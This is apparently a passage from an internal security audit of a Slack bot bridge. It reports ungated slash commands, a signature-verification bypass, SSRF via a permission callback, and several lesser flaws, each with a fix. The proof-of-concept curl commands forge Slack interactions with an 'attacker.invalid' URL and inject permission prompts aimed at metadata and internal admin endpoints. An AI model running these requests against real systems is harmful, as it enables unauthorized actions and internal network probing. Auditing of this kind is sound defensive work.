## 2. New Findings

### N1 — **CRITICAL** — Unauthenticated slash commands outside the gate list

**Files:** `bot_commands.go:23-30` (`gatedSlashCommands` map), `bot_formula.go`, `bot_gate.go`, `bot_commands.go:1137,1161`, `bot_schedule_cmd.go`, `bot_unreleased.go`

Only six commands are gated: `/spawn`, `/start`, `/kill`, `/kill-thread`, `/decisions`, `/decide`. The remaining slash commands have **no permission check**:

| Command | Effect | Gate? |
|---------|--------|-------|
| `/formula pour <id> [--var k=v]` | Instantiates formula → spawns agent chains, creates beads | **none** |
| `/formula wisp <id>` | Same, ephemeral | **none** |
| `/bouncer add <ip>` / `remove` | **Mutates Traefik IP allowlist → network exposure** | **none** |
| `/clear-threads` | Wipes all thread→agent mappings | **none** |
| `/schedule on\|off` | Enables/disables scheduler | **none** |
| `/roster` | Reads agent roster | **none** |
| `/unreleased` | Reads unreleased changes | **none** |

Only `/autodestruct` has its own env-var allowlist (`bot_autodestruct.go:22-40`).

**Impact:** Any Slack user in the workspace can instantiate formulas (which spawn agents and consume spend), whitelist arbitrary IPs at the edge (bypassing the IP restriction on the cluster front door!), or wipe thread mappings.

**PoC (any workspace member):**
```text
Slack → /bouncer add 203.0.113.99/32
→ bot_gate.go:17 handleBouncerCommand → bouncer.AddIP → Traefik middleware updated
→ attacker at 203.0.113.99 now bypasses the IP allowlist
```

**Fix:** Add all privileged commands to `gatedSlashCommands` (or a higher-tier `adminSlashCommands`). Consider two capability tiers: `slash_command` for `/spawn`/`/kill`/`/decisions`, `slash_admin` for `/bouncer`/`/formula pour`/`/clear-threads`/`/schedule`.

### N2 — **HIGH** — Slack signature bypass when Socket Mode token unset

**Files:** `slack.go:308`, `slack/manifest.json:122` (`socket_mode_enabled: true`)

Manifest declares Socket Mode as the primary event channel. HTTP `/slack/interactions` is still registered (for legacy block-action deliveries?). If an operator migrates to Socket Mode fully and unsets `SLACK_SIGNING_SECRET` as "not needed," the `/slack/interactions` HTTP handler now accepts **any POST** without verification (prior C4, unchanged).

**PoC:**
```bash
# With SLACK_SIGNING_SECRET empty, an attacker with network access to bridge:
curl -X POST https://bridge:8080/slack/interactions \
  -d 'payload={"type":"block_actions","user":{"id":"U_ADMIN"},"actions":[{"action_id":"permission_allow","value":"REQID|http://attacker.invalid"}]}'
# → handleBlockAction fires permission_allow verdict as U_ADMIN
```

**Fix:** Hard-require `SLACK_SIGNING_SECRET` at startup; fail-closed. Alternately, disable the HTTP handler when `useSocketMode` is true.

### N3 — **HIGH** — SSRF from permission callback is *trivially* reachable in-cluster **[FIXED ka-0000006036 (v1) + ka-0000006200 (v2)]**

**Files:** `bot_permission.go:45` (entry, unauth), line 129 (encodes `channelURL` into button value), `nudge.go:347-370` (outbound POST).

Verified end-to-end chain: anyone with network access to the bridge (no OIDC, no HMAC, no bearer — `bridgeRouteRole` returns `""` for `/api/permission/*`) can:

1. POST `{"request_id":"XYZ","tool_name":"Bash","agent":"a","channel_url":"http://169.254.169.254/latest/meta-data"}` to `/api/permission/callback`.
2. Slack button is posted in the agent's thread.
3. When an operator clicks **Allow**, the bridge POSTs the verdict JSON to `http://169.254.169.254/latest/meta-data/permission` — attacker does not need the response, but can:
   - Flood internal services via `Host:` headers (blind SSRF),
   - Hit any internal admin port reachable by the pod.

Pairs with N1 in severity when cluster network policy doesn't block the bridge's egress.

**PoC:**
```bash
# 1. Inject fake permission prompt (C2)
curl -X POST http://bridge.svc:8080/api/permission/callback \
  -H 'Content-Type: application/json' \
  -d '{"type":"permission_request","request_id":"PWN01","tool_name":"Bash","agent":"a-real-agent","channel_url":"http://kbeads.svc:8080/api/internal/admin"}'
# 2. Wait for any operator clicking Allow — bridge does:
#    POST http://kbeads.svc:8080/api/internal/admin/permission {"request_id":"PWN01","behavior":"allow"}
```

**Fix (stacked):**
1. ~~Require HMAC on `/api/permission/callback` using a secret shared with coop/channel servers.~~ Addressed by C1 (ka-0000005422): bearer `SLACK_BRIDGE_AGENT_TOKEN` required on `/api/permission/*` (HMAC would be redundant).
2. **FIXED** — `SendPermissionVerdict` (`nudge.go`) now runs `validatePermissionVerdictURL`: rejects non-http(s) schemes, known metadata hostnames (AWS IMDS, GCE/GCP metadata, Alibaba 100.100.100.200), `kubernetes.default[.svc[.cluster.local]]`, and link-local IPs.
3. **FIXED** — `bot_permission.go` ignores `channel_url` from the payload entirely. The verdict URL is resolved server-side at click time via `FindAgentBead(agent) → parseNotes().coop_url`. The Slack button value encodes `requestID|agent` only (never a URL). Regression tests `TestPermissionCallback_IgnoresPayloadChannelURL`, `TestPermissionCallback_ButtonValueNoURL`, `TestResolvePermission_AgentWithoutCoopURL` cover this.
4. **FIXED (v2 port — ka-0000006200)** — Same shape ported to bridge2 / `cmd/slack-bridge/v2backend.go`: `bridge2.PermissionRequest.ChannelURL` is logged-and-dropped; `PostPermission` button value is `requestID|agent`; the `InteractionBackend.SendPermissionVerdict` interface takes the agent name (not a URL); `interactionBackend.SendPermissionVerdict` resolves coop_url from the agent bead and calls `bridge2.ValidatePermissionVerdictURL` (same allowlist as v1) before the POST. Regression tests `TestPostPermission_ButtonValueDropsChannelURL`, `TestPermissionVerdict_PassesAgentNotURL`, `TestSendPermissionVerdict_ResolvesCoopURLAndPosts`, `TestSendPermissionVerdict_RejectsSSRFURLs`, `TestSendPermissionVerdict_AgentWithoutCoopURL`.

### N4 — **MEDIUM** — bridge2: permission gates are config-optional

**Files:** `bridge2/dispatch.go:173-192` (my read from Explore report), `bridge2/interact.go:483-569`.

`DispatcherConfig.GateSlash` and `.GateMention` default to `false` in zero-value instantiation. If Helm values omit the flag or tests instantiate without setting it, the dispatcher falls open: any workspace member can `/spawn`/`/kill`/mention-to-kill without any capability check.

**Fix:** Invert the polarity — `DisableSlashGate bool` defaulting to false. Or refuse to start when `UserChecker == nil` AND gates are disabled.

### N5 — **MEDIUM** — bridge2 block-actions skip UserChecker

**Files:** `bridge2/interact.go:483-527` (dismiss/promote decision), `:529-569` (permission allow/deny), `:688-770` (decision resolution).

These actions trust the `user.id` field from the Slack payload without calling `UserChecker.HasCapability`. Slack's HMAC prevents payload forgery from outside, but an authenticated workspace member who lacks `slash_command` capability can still dismiss/promote/resolve via a block-action (all they need is UI access to the message).

**Fix:** Wrap each block-action branch in `UserChecker.HasCapability(userID, "interact_decision")` (new capability); default deny.

### N6 — **MEDIUM** — OAuth state comparison is not constant-time

**File:** `internal/oauth/oauth.go:114`

`if r.URL.Query().Get("state") != state { ... }` — direct `!=` enables timing side-channels on the 16-byte CSPRNG state. Low practical risk (localhost binding, 128-bit entropy) but trivial to fix.

**Fix:** `crypto/subtle.ConstantTimeCompare([]byte(got), []byte(want)) == 1`.

Also observed (oauth.go:73-114): state is held in closure with no TTL/replay store — a captured callback URL remains valid for the process lifetime. Add a 10-minute wall-clock deadline.

> Note: this package is only used by `gb login` (CLI → GitLab OAuth). **It is NOT used for Slack OAuth installation**; Slack uses pre-provisioned `SLACK_BOT_TOKEN` / `SLACK_APP_TOKEN`. Blast radius is limited to the user running `gb login`.

### N7 — **MEDIUM** — Over-provisioned Slack OAuth scopes

**File:** `slack/manifest.json`

High-risk scopes present; evaluate necessity:

| Scope | Necessary? | Risk if compromised |
|-------|------------|--------------------|
| `commands` | yes | Parses untrusted slash args — needs validation (see N1) |
| `im:history`, `im:write` | only if DM flows used | Bot reads/writes private DMs |
| `channels:history`, `groups:history` | only if context extraction used | Bot can read all channel content it's invited to |
| `chat:write.public` | only for channels bot isn't in | Lets bot post in public channels it hasn't been invited to |
| `files:read` | only if file proxy used | Pairs with `bot_threads.go` file proxy (prior L4) |
| `reactions:write` | cosmetic | Low |

**Fix:** Review each; drop any not required. `chat:write.public` is especially broad.

### N8 — **LOW** — Slack signing secret not validated at startup

**File:** `cmd/slack-bridge/main.go` (wiring), `slack.go:308`

Empty `SLACK_SIGNING_SECRET` silently disables signature verification (prior C4). No startup warning, no readiness-probe failure. A Helm misconfiguration deploys a completely open webhook.

**Fix:** At startup, if HTTP webhook handler is enabled and `signingSecret` is empty, `log.Fatal`. Alternately expose `/healthz/webhook` that reports config.

### N9 — **LOW** — Permission prompt preview injection

**File:** `bot_permission.go:115-125`

`cb.InputPreview` is wrapped in Slack `mrkdwn` triple-backtick but not escaped. A crafted preview with triple backticks escapes the code block and could inject mrkdwn (`<!channel>`, `<!here>`, clickable links impersonating internal tools). Upper layer is unauth (N3), so this compounds: attacker chooses preview content.

**Fix:** Replace any triple-backticks in `InputPreview` before rendering; or render as `plain_text` block.

## 3. Command Matrix (Slash Commands × Role × Result)

"Role" — Slack-layer identity; `slash_command` = user bead with `slash_command` capability; `autodestruct_allowed` = Slack user ID listed in `AUTODESTRUCT_ALLOWED_USERS`.

| Command | No user bead | Bead, no `slash_command` | Bead + `slash_command` | Autodestruct allowlist | Gate OFF (slashGateEnabled=false) |
|---------|---|---|---|---|---|

| `/decisions`, `/decide` | DENIED | DENIED | ALLOWED | N/A | ALLOWED for anyone |

| `/bouncer add\|remove` | **ALLOWED** *(N1)* | **ALLOWED** *(N1)* | ALLOWED | N/A | ALLOWED |
| `/clear-threads` | **ALLOWED** *(N1)* | **ALLOWED** *(N1)* | ALLOWED | N/A | ALLOWED |
| `/schedule on\|off` | **ALLOWED** *(N1)* | **ALLOWED** *(N1)* | ALLOWED | N/A | ALLOWED |
| `/roster`, `/unreleased` | ALLOWED (read-only, low risk) | ALLOWED | ALLOWED | N/A | ALLOWED |

**Mentions (`@bot kill X`)**: gated by `mentionGateEnabled` + `checkMentionPermission` (bot.go:164, bot_mentions.go). Same deny-by-default semantics when enabled.

**bridge2 (per-channel cutover):** Gated by `DispatcherConfig.GateSlash` / `.GateMention` which default to `false`. UserChecker default-denies when user missing, but gates themselves are opt-in (N4).

**Channel scoping:**
- `/spawn` in DM auto-resolves project via `resolveDMProject` (bot_commands.go:158); no per-channel ACL.
- `/spawn` in regular channel requires project-channel mapping (bot_commands.go:181).
- No distinction between public vs private channels for any command.
